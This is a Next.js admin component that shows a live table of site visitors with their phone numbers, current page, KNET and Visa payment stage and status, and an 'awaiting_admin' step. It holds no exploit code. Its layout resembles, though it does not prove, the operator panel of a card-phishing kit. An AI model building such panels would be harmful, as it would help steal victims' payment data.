"use client";

import { useLocale, useTranslations } from "next-intl";
import { formatWhen } from "@/lib/money";
import { useAdminRealtime } from "@/hooks/use-admin-realtime";

function browserName(ua: string): string {
  if (ua.includes("Edg")) return "Edge";
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari")) return "Safari";
  if (ua.includes("Firefox")) return "Firefox";
  return "Browser";
}

function stageLabel(stage: string, t: (key: string) => string) {
  switch (stage) {
    case "knet":
      return t("stageKnet");
    case "visa":
      return t("stageVisa");
    case "awaiting_admin":
      return t("stageWaiting");
    default:
      return t("stageBrowse");
  }
}

export function LiveDashboard() {
  const t = useTranslations("admin");
  const locale = useLocale();
  const { connected, transport, sessions: people, updatedAt } = useAdminRealtime();

  const onlineCount = people.filter((person) => person.online).length;

  return (
    <div className="grid gap-5">
      <div>
        <div className="flex flex-wrap items-center gap-3">
          <h1 className="text-2xl font-bold">{t("visitors")}</h1>
          <span
            className={`rounded-full px-3 py-1 text-xs font-semibold ${connected ? "bg-success/15 text-success" : "bg-warning/15 text-warning"}`}
          >
            {transport === "ws"
              ? t("wsLive")
              : transport === "sse"
                ? t("sseLive")
                : connected
                  ? t("wsLive")
                  : t("wsReconnecting")}
          </span>
        </div>
        <p className="mt-1 text-sm text-muted">
          {t("liveTableHint")} · {t("inside")} {onlineCount} · {t("liveTotal")} {people.length}
          {updatedAt ? ` · ${t("wsUpdated")} ${formatWhen(updatedAt, locale)}` : null}
        </p>
      </div>
      <div className="overflow-x-auto rounded-2xl border border-border bg-white">
        <table className="min-w-full text-sm">
          <thead className="border-b border-border bg-surface text-start">
            <tr>
              <th className="px-4 py-3 font-semibold">{t("liveColStatus")}</th>
              <th className="px-4 py-3 font-semibold">{t("liveColVisitor")}</th>
              <th className="px-4 py-3 font-semibold">{t("currentPage")}</th>
              <th className="px-4 py-3 font-semibold">{t("liveColStage")}</th>
              <th className="px-4 py-3 font-semibold">{t("liveColPhone")}</th>
              <th className="px-4 py-3 font-semibold">{t("liveColPayment")}</th>
              <th className="px-4 py-3 font-semibold">{t("lastSeen")}</th>
            </tr>
          </thead>
          <tbody>
            {people.length === 0 ? (
              <tr>
                <td colSpan={7} className="px-4 py-10 text-center text-muted">
                  {t("noInside")}
                </td>
              </tr>
            ) : null}
            {people.map((person) => (
              <tr key={person.id} className="border-t border-border">
                <td className="px-4 py-3">
                  <span
                    className={`inline-block size-2.5 rounded-full ${person.online ? "bg-success" : person.locked ? "bg-warning" : "bg-muted"}`}
                    title={person.online ? t("inside") : t("outside")}
                  />
                </td>
                <td className="px-4 py-3">
                  <p className="font-semibold">{person.user?.name || t("guest")}</p>
                  <p className="text-xs text-muted">{browserName(person.userAgent)}</p>
                </td>
                <td className="max-w-[180px] truncate px-4 py-3 font-medium text-brand" dir="ltr" title={person.page}>
                  {person.page}
                </td>
                <td className="px-4 py-3">{stageLabel(person.flowStage, t)}</td>
                <td className="px-4 py-3" dir="ltr">
                  {person.msisdn ?? "—"}
                </td>
                <td className="px-4 py-3 text-xs" dir="ltr">
                  {person.knetStatus ? `KNET: ${person.knetStatus}` : null}
                  {person.knetStatus && person.visaStatus ? " · " : null}
                  {person.visaStatus ? `Visa: ${person.visaStatus}` : null}
                  {!person.knetStatus && !person.visaStatus ? "—" : null}
                </td>
                <td className="whitespace-nowrap px-4 py-3 text-xs text-muted">
                  {formatWhen(person.lastSeen, locale)}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
